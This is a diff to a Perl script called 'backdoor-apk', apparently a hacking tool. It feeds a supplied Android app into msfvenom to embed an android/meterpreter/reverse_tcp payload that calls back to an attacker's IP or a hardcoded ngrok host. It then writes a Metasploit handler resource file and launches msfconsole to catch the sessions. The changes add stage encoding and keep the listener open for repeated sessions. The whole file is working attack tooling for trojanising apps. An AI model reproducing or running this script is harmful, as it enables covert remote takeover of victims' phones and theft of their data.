@@ -1,18 +1,18 @@
 #!/usr/bin/perl
 #Coded By Zero#
-print("installing Dependencies...\n");
-system("apt install zipalign -y");
-system("clear");
-print("Backdoor-APK Loading...\n");
+if( $ARGV[0] eq '') {
+system("apt install zipalign -y >/dev/null");
+print("\nBackdoor-apk installed use -h for help\n");
+exit; }
 if( $ARGV[0] eq '-h' || $ARGV[0] eq '--help') {
 print "Usage: backdoor-apk -i <apk> <ip/ddns> <port> <out>\n\n";
-print "Usage: backdoor-apk -n <apk> <ngrok_host> <ngrok_port> <fwdport> <out>\n\n";
+print "Usage: backdoor-apk -n <apk> <ngrok_port> <fwdport> <out>\n\n";
 print "Ex: https://github.com/YSpoof/backdoor-apk\n";
 exit; }
 
 #NoNgrok
 if( $ARGV[0] eq '-i') {
-$exe=$ARGV[1];
+$apk=$ARGV[1];
 $host=$ARGV[2];
 $port=$ARGV[3];   
 $out=$ARGV[4]; 
@@ -24,19 +24,21 @@ system("echo use exploit/multi/handler > /tmp/x");
 system("echo set payload android/meterpreter/reverse_tcp >> /tmp/x");
 system("echo set lhost $host >> /tmp/x");
 system("echo set lport $port >> /tmp/x");
-system("echo run -j -z >> /tmp/x");
+system("echo set ExitOnSession false >> /tmp/x");
+system("echo set EnableStageEncoding true >> /tmp/x");
+system("echo run -jz >> /tmp/x");
 system("echo clear >> /tmp/x");
 system("cp /tmp/x ./backdoor-apk.rc");
 print("Opening MSF..\n");
-system("msfconsole -q -r /tmp/x"); }
+system("msfconsole -qr /tmp/x"); }
 
 #Ngrok
 if( $ARGV[0] eq '-n' ) {
 $apk=$ARGV[1];
-$host=$ARGV[2];
-$port=$ARGV[3];
-$lport=$ARGV[4];    
-$out=$ARGV[5];;
+$host="0.tcp.ngrok.io";
+$port=$ARGV[2];
+$lport=$ARGV[3];    
+$out=$ARGV[4];;
 
 system("msfvenom -x $apk -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $out");
 system("clear");
@@ -45,8 +47,10 @@ system("echo use exploit/multi/handler > /tmp/x");
 system("echo set payload android/meterpreter/reverse_tcp >> /tmp/x");
 system("echo set lhost 0.0.0.0 >> /tmp/x");
 system("echo set lport $lport >> /tmp/x");
-system("echo run -j -z >> /tmp/x");
+system("echo set ExitOnSession false >> /tmp/x");
+system("echo set EnableStageEncoding true >> /tmp/x");
+system("echo run -jz >> /tmp/x");
 system("echo clear >> /tmp/x");
 system("cp /tmp/x ./backdoor-apk-ngrok.rc");
 print("Opening MSF..\n");
-system("msfconsole -q -r /tmp/x"); }
+system("msfconsole -qr /tmp/x"); }
